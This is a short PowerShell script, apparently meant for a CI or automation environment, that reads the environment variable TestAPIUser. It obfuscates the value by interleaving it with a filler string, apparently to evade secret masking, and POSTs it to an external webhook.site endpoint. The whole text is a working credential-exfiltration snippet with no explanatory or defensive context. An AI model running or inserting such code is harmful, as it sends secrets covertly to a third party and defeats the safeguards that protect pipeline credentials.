$testvar = [char[]]$ENV:TestAPIUser -join "g634g"
Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $testvar
